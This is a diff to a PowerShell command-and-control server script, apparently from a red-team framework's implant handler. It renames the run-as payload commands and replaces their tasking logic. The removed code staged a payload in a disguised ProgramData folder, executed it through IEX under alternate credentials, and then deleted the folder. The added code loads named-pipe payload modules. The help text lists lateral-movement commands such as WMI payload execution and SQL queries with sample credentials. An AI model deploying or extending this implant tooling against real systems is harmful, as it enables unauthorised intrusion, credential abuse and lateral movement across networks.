@@ -173,8 +173,8 @@ function Implant-Handler
         Write-Host " Get-LocAdm" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
         Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
-        Write-Host " Invoke-RunAs-Payload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
-        Write-Host " Invoke-RunAs-ProxyPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
+        Write-Host " Invoke-RunAsPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
+        Write-Host " Invoke-RunAsProxyPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
         write-host " Invoke-WMICommand -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>' -command <cmd>" -ForegroundColor Green
         write-host " Invoke-WMIPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
@@ -759,55 +759,28 @@ $error.clear()
             {
                 CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
             }
-            if ($pscommand.ToLower().StartsWith('invoke-runas-payload'))
+            if ($pscommand.ToLower().StartsWith('invoke-runaspayload'))
             { 
-                CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
-                $pscommand = $pscommand -replace 'invoke-runas-payload', ''
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
-                } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = '$payload | out-file c:\programdata\msofficepro98\registry.dat'
-                } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "invoke-runas $($pscommand) -cmd 'powershell.exe' -args '-c $($speechmarks)IEX (get-content c:\programdata\msofficepro98\registry.dat)$($speechmarks)'"
-                } | Out-Null
-                $pscommand = "start-sleep 5; remove-item c:\programdata\msofficepro98 -recurse"
+                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                CheckModuleLoaded "invoke-runaspayload.ps1" $psrandomuri
+                $pscommand = $pscommand -replace 'invoke-runaspayload', ''
+                $pscommand = "invoke-runaspayload $($pscommand)"
+                
             }     
-            if ($pscommand.ToLower().StartsWith('invoke-runas-proxypayload'))
+            if ($pscommand.ToLower().StartsWith('invoke-runasproxypayload'))
             { 
             if (Test-Path "$FolderPath\proxypayload.bat"){ 
                 $proxypayload = Get-Content -Path "$FolderPath\proxypayload.bat"     
-                CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
-                $pscommand = $pscommand -replace 'invoke-runas-proxypayload', ''
                 $query = "INSERT INTO NewTasks (RandomURI, Command)
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
+                    Command   = '$proxypayload = "'+$proxypayload+'"'
                 } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "'$proxypayload' | out-file c:\programdata\msofficepro98\registry.dat"
-                } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "invoke-runas $($pscommand) -cmd 'powershell.exe' -args '-c $($speechmarks)IEX (get-content c:\programdata\msofficepro98\registry.dat)$($speechmarks)'"
-                } | Out-Null
-                $pscommand = "start-sleep 5; remove-item c:\programdata\msofficepro98 -recurse"
+                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
+                CheckModuleLoaded "invoke-runasproxypayload.ps1" $psrandomuri
+                $pscommand = $pscommand -replace 'invoke-runasproxypayload', ''
+                $pscommand = "invoke-runasproxypayload $($pscommand)"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
